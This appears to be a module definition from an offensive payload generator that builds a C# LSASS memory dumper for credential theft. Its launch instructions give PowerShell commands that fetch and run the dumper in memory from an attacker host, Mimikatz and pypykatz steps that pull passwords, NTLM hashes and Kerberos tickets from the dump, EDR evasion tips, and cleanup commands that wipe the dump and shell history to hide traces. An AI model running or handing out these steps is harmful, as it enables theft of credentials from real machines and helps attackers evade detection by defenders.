meta:
  name: "LSASS MiniDump Credential Dumper (C#)"
  category: "Credential Access"
  description: |
    Dumps LSASS process memory to extract credentials using MiniDumpWriteDump.
    
    Features:
    - Direct LSASS memory dumping
    - Uses DbgHelp.dll MiniDumpWriteDump API
    - Configurable output path
    - Full memory dump for maximum credential extraction
    - Minimal obfuscation (straightforward implementation)
    
    The dumped file can be analyzed offline with tools like Mimikatz or pypykatz
    to extract plaintext passwords, NTLM hashes, Kerberos tickets, and other credentials.
    
    WARNING: For authorized security testing only! This technique is heavily monitored by EDR.

  effectiveness: "low"

  mitre:
    tactic: "TA0006 - Credential Access"
    technique: "T1003.001 - OS Credential Dumping: LSASS Memory"

  artifacts:
    - "OpenProcess on lsass.exe (PID lookup)"
    - "MiniDumpWriteDump API calls"
    - "Large dump file creation (50-200 MB typical)"
    - "PROCESS_ALL_ACCESS on LSASS"
    - "File creation in specified path"
    - "Sysmon Event ID 10 (ProcessAccess)"

parameters:
  - name: "dump_path"
    type: "string"
    description: "Full path where LSASS dump file will be saved"
    required: true
    default: "C:\\Windows\\Tasks\\lsass.dmp"

  - name: "output_file"
    type: "string"
    description: "Output executable filename"
    required: false
    default: "dumper.exe"

  - name: "output_path"
    type: "path"
    description: "Output directory for generated payload"
    required: false
    default: "{config.output_dir}"

preprocessing: []

output:
  type: "template"
  template: "credential_access/minidump.cs"
  compile:
    enabled: true
    command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 {{ source_file }}"
  launch_instructions: |
    LSASS MiniDump Credential Dumper - Launch Instructions

    Step 1: Execute Dumper on Target

    In-memory execution (no file drop):
    $data = (New-Object System.Net.WebClient).DownloadData('http://YOUR_IP/{{ output_file }}')
    $assem = [System.Reflection.Assembly]::Load($data)
    [Program]::Main("{{ dump_path }}".Split())

    Traditional execution:
    Invoke-WebRequest -Uri "http://YOUR_IP/{{ output_file }}" -OutFile "{{ output_file }}"; .\{{ output_file }}

    With custom dump path:
    Invoke-WebRequest -Uri "http://YOUR_IP/{{ output_file }}" -OutFile "{{ output_file }}"; .\{{ output_file }} C:\\Temp\\lsass_backup.dmp

    Step 2: Extract Credentials

    On attacker machine (Linux with pypykatz):
    pypykatz lsa minidump lsass.dmp

    On attacker machine (Windows with Mimikatz):
    mimikatz.exe
    sekurlsa::minidump lsass.dmp
    sekurlsa::logonPasswords full

    Notes:

    - Requires Administrator privileges or SeDebugPrivilege
    - Default dump path: {{ dump_path }}
    - Dump file size: typically 50-200 MB
    - HEAVILY monitored by EDR/AV (high detection rate)
    - DbgHelp.dll must be present (included in Windows by default)
    - Sysmon logs ProcessAccess events (Event ID 10) to LSASS
    - Windows Defender often blocks direct LSASS access
    - Extracted credentials: plaintext passwords (if WDigest enabled), NTLM hashes, Kerberos tickets, domain cached credentials

    Evasion Tips:

    - Use process cloning techniques instead of direct dump
    - Implement syscalls to bypass userland hooks
    - Dump from Volume Shadow Copy instead
    - Use PPLdump for Protected Process Light bypass
    - Alternative method: rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump [LSASS_PID] C:\\temp\\lsass.dmp full

    Troubleshooting:

    - Access Denied: Run as Administrator or obtain SeDebugPrivilege
    - File creation fails: Check disk space and path permissions
    - No credentials extracted: LSASS may be protected (PPL)
    - EDR blocks: This is expected; technique is well-known

    Cleanup:

    Securely delete dump file and payload:
    sdelete64 -p 7 {{ dump_path }}
    Remove-Item {{ dump_path }} -Force
    Remove-Item {{ output_file }} -Force
    Clear-History
    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
